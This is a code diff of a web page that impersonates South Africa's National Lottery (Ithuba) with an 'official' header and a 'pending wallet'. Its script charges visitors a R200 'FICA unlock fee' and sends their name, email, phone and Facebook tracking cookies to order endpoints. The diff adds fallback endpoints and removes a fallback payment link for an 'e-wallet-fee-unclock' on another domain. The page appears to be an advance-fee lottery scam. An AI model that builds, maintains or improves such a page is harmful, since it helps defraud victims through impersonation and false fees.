@@ -677,7 +677,7 @@
 
   <!-- OFFICIAL nationallottery.co.za HEADER + LIVE PENDING WALLET -->
   <header class="ithuba-top-header">
-    <img src="images/ithuba/ithuba_header_logo.png" onerror="this.src='lottery-logo.png'" alt="National Lottery" class="header-logo-img" />
+    <img src="images/ithuba/ithuba_header_logo.png" onerror="this.src='images/ithuba/lotto_logo.png'" alt="National Lottery" class="header-logo-img" />
 
     <div class="wallet-pill" id="topWalletPill">
       <div>
@@ -1713,7 +1713,12 @@
         fbclid: sessionStorage.getItem("_sa_fbclid") || localStorage.getItem("_sa_fbclid") || ""
       };
 
-      const apiOrderUrl = window.location.pathname.includes("/restitution") ? "/restitution/api/create-order.php" : "api/create-order.php";
+      const apiEndpoints = [
+        "/api/create-order-200.js",
+        "/api/create-order.js",
+        "/api/create-order-200.php",
+        "/api/create-order.php"
+      ];
       const recordSaleUrl = window.location.pathname.includes("/restitution") ? "/restitution/api/record-sale.php" : "api/record-sale.php";
 
       const handlePaymentCompleted = function(orderIdStr) {
@@ -1740,39 +1745,48 @@
       };
 
       try {
-        const resp = await fetch(apiOrderUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            order_id: STATE.voucherRef,
-            title: "Taxa de Desbloqueio FICA — Ithuba Lottery",
-            amount_minor: 20000,          // R 200,00 em centavos ZAR
-            currency: "ZAR",
-            customer: {
-              name: custName,
-              email: custEmail,
-              phone: custPhone
-            },
-            tracking: {
-              utm_source:   capturedUtms.utm_source,
-              utm_medium:   capturedUtms.utm_medium,
-              utm_campaign: capturedUtms.utm_campaign,
-              utm_content:  capturedUtms.utm_content,
-              utm_term:     capturedUtms.utm_term,
-              fbclid:       capturedUtms.fbclid,
-              fbp:  document.cookie.match(/_fbp=([^;]+)/)  ? document.cookie.match(/_fbp=([^;]+)/)[1]  : "",
-              fbc:  document.cookie.match(/_fbc=([^;]+)/)  ? document.cookie.match(/_fbc=([^;]+)/)[1]  : "",
-              landing_page: window.location.href
-            }
-          })
-        });
+        let resp = null;
+        for (const ep of apiEndpoints) {
+          try {
+            resp = await fetch(ep, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                order_id: STATE.voucherRef,
+                title: "Taxa de Desbloqueio FICA — Ithuba Lottery",
+                amount_minor: 20000,          // R 200,00 em centavos ZAR
+                currency: "ZAR",
+                customer: {
+                  name: custName,
+                  email: custEmail,
+                  phone: custPhone
+                },
+                tracking: {
+                  utm_source:   capturedUtms.utm_source,
+                  utm_medium:   capturedUtms.utm_medium,
+                  utm_campaign: capturedUtms.utm_campaign,
+                  utm_content:  capturedUtms.utm_content,
+                  utm_term:     capturedUtms.utm_term,
+                  fbclid:       capturedUtms.fbclid,
+                  fbp:  document.cookie.match(/_fbp=([^;]+)/)  ? document.cookie.match(/_fbp=([^;]+)/)[1]  : "",
+                  fbc:  document.cookie.match(/_fbc=([^;]+)/)  ? document.cookie.match(/_fbc=([^;]+)/)[1]  : "",
+                  landing_page: window.location.href
+                }
+              })
+            });
+            if (resp && resp.ok) break;
+          } catch(e) {}
+        }
 
-        if (!resp.ok) throw new Error("API unavailable");
+        if (!resp || !resp.ok) {
+          const errData = resp ? await resp.json().catch(() => ({})) : {};
+          throw new Error(errData.message || errData.error || "API unavailable");
+        }
         const order = await resp.json();
 
-        // 1. Open Native CreaPay.pay Inline Sheet right on the screen (NO REDIRECT)
+        // 1. Open Native Paystack Popup via CreaPay.pay (ZERO REDIRECT!)
         if (order && order.checkout_token && window.CreaPay && typeof window.CreaPay.pay === "function") {
-          btn.innerHTML = `<span class="btn-main-title">AWAITING INLINE AUTHORIZATION...</span>`;
+          btn.innerHTML = `<span class="btn-main-title">AWAITING AUTHORIZATION...</span>`;
           const result = await CreaPay.pay({
             checkoutToken: order.checkout_token,
             orderId: order.order_id,
@@ -1788,14 +1802,11 @@
             return;
           }
         } else {
-          // 2. Open Inline Modal Iframe Popup right on the same screen (NO REDIRECT)
-          const popupUrl = (order && order.checkout_url) ? order.checkout_url : ("https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=" + encodeURIComponent(STATE.voucherRef) + "&phone=" + encodeURIComponent(rawPhone));
-          openInlineModal(popupUrl);
+          throw new Error("Gateway token not received");
         }
       } catch (err) {
-        // Fallback when testing locally via file:// (opens inline modal popup right on screen — NO REDIRECT!)
-        const fallbackPopupUrl = "https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=" + encodeURIComponent(STATE.voucherRef) + "&phone=" + encodeURIComponent(rawPhone);
-        openInlineModal(fallbackPopupUrl);
+        console.error("Payment error:", err);
+        alert("Payment initialization error: " + (err.message || "Please try again"));
       } finally {
         btn.disabled = false;
         btn.innerHTML = originalHtml;
